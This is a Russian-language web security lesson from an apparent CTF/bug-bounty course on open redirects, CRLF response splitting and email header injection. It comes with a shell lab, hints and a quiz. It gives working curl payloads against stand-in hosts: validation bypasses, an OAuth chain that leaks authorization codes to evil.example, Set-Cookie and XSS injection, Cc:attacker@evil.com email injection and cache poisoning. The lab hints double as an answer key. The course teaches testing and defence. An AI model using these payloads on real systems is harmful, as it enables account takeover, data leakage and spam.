---
id: web-open-redirect-crlf
title: "Open Redirect, CRLF-инъекция и заголовочные атаки"
category: web
parent: web-xss-client-side
difficulty: medium
order: 1
tags: [open-redirect, crlf, header-injection, email-injection, response-splitting]
prerequisites: [web-xss]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 34
summary: "Подмена редиректа, вставка переводов строк в заголовки и письма — и как это усиливает XSS и SSRF."
lab:
  kind: shell
  title: "Практика: open redirect → CRLF"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - Штатный редирект: `curl -s -i 'http://app.example/redirect?next=/home'`.
    - Открытый редирект: `curl -s -i 'http://app.example/redirect?next=https://evil.test'`.
    - Инъекция заголовка через CRLF: `curl -s -i 'http://app.example/redirect?next=%0d%0aSet-Cookie:%20role=admin'`.
    - Возьми админку с полученной cookie: `curl -s 'http://app.example/admin' -H 'Cookie: role=admin' | tail -1 > found.txt`, затем `check`.
---

## Вопрос, с которого всё начинается

Некоторые уязвимости сами по себе «низкие», но в **цепочке** с другой дают критичный результат. Open Redirect, CRLF-инъекция и инъекция в заголовки письма — ровно такие «усилители»: в отрыве это Medium, но в связке с OAuth или XSS они превращаются в захват аккаунта.

Вопрос: как из «просто редиректа» получить кражу токена? Разберём три техники на одном примере — приложении с логином и редиректом после него.

## Наш пример

Есть приложение `app.example`. После логина оно возвращает пользователя на страницу, указанную в параметре `next`:

```bash
$ curl -s -i 'https://app.example/login?next=/dashboard' | grep -i '^location'
Location: /dashboard
```

Параметр `next` управляет заголовком `Location`. Что, если подставить туда внешний адрес?

```bash
$ curl -s -i 'https://app.example/login?next=https://evil.example' | grep -i '^location'
Location: https://evil.example
```

Сервер **без проверки** перенаправил нас на чужой домен. Это **Open Redirect** — открытый редирект. Сам по себе он выглядит безобидно, но посмотрим, во что он превращается.

## Шаг 1: где живёт open redirect

Приложения используют разные имена параметра для редиректа: `next`, `url`, `return`, `continue`, `redirect`, `dest`, `callback`. Найти их можно в JS-файлах и HTML форм:

```bash
$ grep -rEo '(next|url|return|redirect|dest|callback)=[^&"]*' /tmp/site-js/ | sort -u
```

Сам по себе open redirect — Medium. Ценность появляется в комбинации:

- **OAuth/SSO:** провайдер доверяет `redirect_uri` нашему домену, а тот редиректит дальше на чужой;
- **фишинг:** в ссылке стоит доверенный домен, что повышает доверие жертвы;
- **CSRF:** редирект на том же домене помогает обойти проверку `Referer`/`Origin`.

## Шаг 2: обход валидации

Наивная защита «запретить `https://evil`» обходится десятком способов. Основные:

| Валидация | Обход |
|-----------|-------|
| `startsWith('https://allowed.com/')` | `https://allowed.com@attacker.com` (userinfo) |
| `includes('allowed.com')` | `https://attacker.com/allowed.com` (в пути) |
| `host === 'allowed.com'` | `https://allowed.com.attacker.com` (поддомен) |
| блок `//` в начале | `https:/attacker.com` (один слэш) |
| блок `/` в начале | `\/\/attacker.com` (обратные слеши) |
| проверка до декодирования | `%252f%252fattacker.com` (двойное кодирование) |
| проверка только схемы | `https:attacker.com` (схема без `//`) |

```bash
$ curl -s -o /dev/null -w '%{redirect_url}\n' \
  'https://app.example/login?next=//evil.example'
//evil.example
```

`//evil.example` — «scheme-relative» URL: браузер подставит текущую схему (`https`) и уйдёт на чужой домен. Валидация, которая проверяет только начало строки, это пропустит.

## Шаг 3: превращаем редирект в кражу токена

Теперь цепочка. Есть OAuth-провайдер `idp.example`, который **строго** проверяет `redirect_uri` — принимает только `https://app.example/cb`. Но `app.example/cb` после обмена кода делает редирект на параметр `next` без проверки:

```text
https://idp.example/authorize?client_id=app
  &redirect_uri=https://app.example/cb?next=https://evil.example
  &response_type=code&scope=openid
```

Провайдер видит **доверенный** `redirect_uri` (`app.example`), отдаёт туда `code`, а приложение перекидывает на `evil.example` **вместе с кодом**. Мы получаем код авторизации и меняем его на токен. Цепочка «open redirect + слабая валидация `next`» = захват аккаунта. Именно поэтому open redirect на OAuth-домене — это уже не Medium, а Critical.

## Шаг 4: CRLF-инъекция

Вторая техника — вставка переводов строк в **заголовки ответа**. Строка HTTP-заголовка заканчивается символами CR (`\r`) и LF (`\n`); если приложение вставляет наш ввод в заголовок без фильтрации, мы можем добавить **свои** заголовки.

`%0d%0a` — это URL-кодирование `\r\n`. Проверим:

```bash
$ curl -s -i 'https://app.example/login?next=https://x%0d%0aX-Injected:yes' | grep -i 'x-injected'
X-Injected: yes
```

Наш заголовок `X-Injected` появился в ответе. Это **CRLF-инъекция** (или HTTP Response Splitting). Что можно сделать:

```bash
# 1) вставить cookie (session fixation)
$ curl -s -i 'https://app.example/login?next=x%0d%0aSet-Cookie:SID=attacker'
# 2) подменить тело ответа (XSS)
$ curl -s -i 'https://app.example/login?next=x%0d%0a%0d%0a<script>alert(1)</script>'
```

Двойной `%0d%0a%0d%0a` завершает заголовки и начинает **тело** ответа — так вставляется свой HTML со скриптом. Варианты обхода фильтра: `%0a` (только LF), `%0d`, `%250d%250a` (двойное кодирование), `\u000d\u000a`.

## Шаг 5: инъекция в заголовки письма

Третья техника — та же логика, но в письмах. Если форма обратной связи вставляет имя в заголовок письма (`From`, `Subject`), `\r\n` позволяет добавить **свои** заголовки:

```bash
$ curl -s -X POST https://app.example/feedback \
  --data-urlencode 'email=victim@x.com%0aCc:attacker@evil.com' \
  --data 'message=hi'
```

Строка `Cc:attacker@evil.com` после перевода строки становится **скрытым получателем** — копия письма уходит нам. Это утечка содержимого и вектор спама от имени доверенного домена. Аналогично инъецируют `Bcc`, `To`, `Reply-To`, а двойным `\r\n\r\n` подменяют тело письма.

## Шаг 6: что делать и как фиксить

**Тестирование:**

1. найди redirect-параметры (`next`, `url`, `return`, `dest`, `callback`);
2. проверь реакцию через `Location` в ответе, **не следуя** за редиректом;
3. перебери обходы (userinfo, поддомен, слэш, кодировки);
4. проверь CRLF (`%0d%0a`) в параметре, идущем в заголовок;
5. проверь формы обратной связи на инъекцию в заголовки письма;
6. оцени цепочку (OAuth/SSO) и оформи PoC.

**Защита** (для понимания): валидируй редирект **после** полного декодирования и нормализации, сравнивая разобранный хост, а не строку; используй белый список; для CRLF — запрещай `\r`/`\n` в любом вводе, идущем в заголовки.

## Шаг 7: CRLF → cache poisoning

Есть ещё одно последствие CRLF-инъекции, которое часто упускают: **отравление кэша**. Если между тобой и приложением стоит кэш (CDN, обратный прокси), он кэширует ответ по URL. Вставив через CRLF свои заголовки, можно заставить кэш сохранить **подменённый ответ** и отдавать его другим пользователям:

```bash
$ curl -s 'https://app.example/page?x=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a<script>alert(1)</script>'
```

Если кэш это проглотит, любой, кто откроет `/page?x=...`, получит наш скрипт — это уже stored XSS на всех. Детали — в `web-cache-poisoning`. Поэтому CRLF-инъекцию стоит проверять не только на прямом ответе, но и **через кэш**: тот же запрос повторяется дважды, и второй раз проверяется, что отдаётся именно подменённое содержимое.

## Что мы теперь знаем

- Open Redirect — параметр управляет `Location` без проверки.
- Сам по себе Medium, но с OAuth/SSO — захват аккаунта.
- Обходы: userinfo (`@`), поддомен, один слэш, кодировки.
- CRLF (`%0d%0a`) вставляет свои заголовки и тело ответа.
- Email header injection добавляет `Cc`/`Bcc` — утечка письма.
- Все три — «усилители»: ищи, что они позволяют в цепочке.
- Артефакт — `Location: evil.example`, вставленный заголовок, чужой `Cc`.

## На что смотреть дальше

- **Недооценивать open redirect нельзя** — всегда ищи, где он «усиливает» (OAuth, SSO, CSRF).
- **Пробуй не только `https://evil.com`** — обходы через `@`, `#`, tab, смену схемы часто проходят.
- **CRLF нужно кодировать** (`%0d%0a`), иногда дважды; смотри «сырой» ответ в Burp.
- **CRLF опасен только в заголовках ответа**, не в теле.
- **Проверяй email-формы** — инъекция заголовков частая находка.
- **Не рассылай спам** — проверяй на своём ящике.

## Квиз

Проверь себя.

```quiz
- question: "Что такое open redirect?"
  options:
    - "Редирект на 404"
    - "Редирект на произвольный внешний URL через параметр без валидации"
    - "Внутренний роутинг SPA"
    - "Кеширование редиректов"
  answer: 1
  explanation: "Параметр `next`/`url` управляет `Location` без проверки."
- question: "Какие символы используются для CRLF-инъекции?"
  options:
    - "`\\t\\n`"
    - "`\\r\\n` (кодируются как `%0d%0a`)"
    - "`\\0`"
    - "`%20`"
  answer: 1
  explanation: "CR + LF завершают строку заголовка."
- question: "К чему приводит HTTP response splitting?"
  options:
    - "К утечке TLS-ключа"
    - "К добавлению своих заголовков/тела (cookie injection, XSS, cache poisoning)"
    - "К SQL-инъекции"
    - "К отказу DNS"
  answer: 1
  explanation: "Вставив CRLF, вы добавляете свои заголовки или тело ответа."
- question: "Как email header injection приводит к утечке?"
  options:
    - "Через шифрование письма"
    - "Через добавление `Cc`/`Bcc: attacker@evil.com`"
    - "Через смену темы"
    - "Через вложение"
  answer: 1
  explanation: "Инъекция скрытого получателя отправляет копию письма атакующему."
- question: "Почему open redirect усиливает OAuth-атаки?"
  options:
    - "Он ускоряет обмен кода"
    - "Доверенный `redirect_uri` превращается в переадресацию на домен атакующего — код авторизации утекает"
    - "Он шифрует токен"
    - "Он отключает `state`"
  answer: 1
  explanation: "Провайдер доверяет домену, а тот редиректит на `evil.com` с кодом."
```

## Куда дальше

Дальше мы разберём **dangling markup** — технику, которая «утекает» данные из страницы без JavaScript, ломая разметку. А пока главное запомни: open redirect, CRLF и email injection — это **усилители**, и их ценность раскрывается в цепочке.

## Где пригодится

- **CTF (Web):** цепочки «open redirect → OAuth» и CRLF → XSS — частые сюжеты задач.
- **Bug bounty:** open redirect на OAuth-домене, CRLF, email injection — валидные находки разного уровня.
- **Пентест:** проверка редиректов и инъекций в заголовки — обязательный пункт веб-тестирования.
- **Работа (AppSec/Dev):** whitelist редиректов и фильтрация CRLF — базовая защита.
